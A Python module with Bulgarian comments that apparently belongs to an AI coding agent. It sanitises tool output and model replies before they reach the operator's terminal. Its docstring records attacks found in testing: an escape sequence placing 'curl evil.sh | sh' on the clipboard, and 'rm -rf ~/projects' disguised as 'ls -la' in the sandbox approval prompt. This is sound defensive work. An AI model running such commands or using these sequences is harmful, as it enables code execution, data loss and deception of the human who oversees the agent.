"""Чужд текст към терминала — без управляващи последователности (2026-11-05).

Резултатът на инструмент (прочетен файл, изход на команда, отговор на MCP
сървър) и отговорът на модела се печатат в терминала на оператора. Rich маха
само BEL/BS/CR и пуска ESC: измерено 2026-11-05 — файл в репото с
`ESC]52;c;<base64>ESC\\` пишеше „curl evil.sh | sh“ в клипборда, щом Genesis
покаже прочетеното (3 от 3 пътя: резултат, отговор, предупреждение); `ESC]0;`
сменяше заглавието, `ESC[2J` чистеше екрана, `ESC]8;;` подменяше връзката. В
питането на sandbox-а `rm -rf ~/projects ESC[2K ESC[1G ls -la` се показваше
като `ls -la` — операторът одобрява друга команда; U+202E (Trojan Source)
обръщаше реда. Тук всеки такъв знак става видим заместител (ESC → ␛), а
останалото (кирилица, емоджи, табулации, нови редове) остава същото.
"""
from __future__ import annotations

import re

# C0 без \t, \n и \r (Rich сам маха \r — прогресът на pip), DEL и C1
# (U+0080–U+009F: 8-битовият CSI U+009B се изпълнява от някои терминали).
_CONTROL = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\x9f]")
# Обръщане и изолиране на посоката — пренарежда показания ред.
_BIDI = re.compile(r"[\u202a-\u202e\u2066-\u2069]")
# Само в питането на sandbox-а: невидими знаци и знаци за посока — `r` +
# U+200B + `m` изглежда като `rm`, а не е същата команда.
_HIDDEN = re.compile(r"[\u200b-\u200f\u2060\ufeff\u00ad\u061c\r]")


def _picture(match: re.Match[str]) -> str:
    code = ord(match.group(0))
    if code == 0x1B:
        return "␛"
    if code < 0x20:
        return chr(0x2400 + code)        # ␀ ␁ … (Control Pictures)
    if code == 0x7F:
        return "␡"
    return f"\\x{code:02x}"


def _escape(match: re.Match[str]) -> str:
    return f"\\u{ord(match.group(0)):04x}"


def safe(text: str, *, strict: bool = False) -> str:
    """`text` с видими заместители на управляващите знаци. `strict` — и
    невидимите знаци, за командата, която операторът одобрява."""
    text = _BIDI.sub(_escape, _CONTROL.sub(_picture, str(text)))
    return _HIDDEN.sub(_escape, text) if strict else text
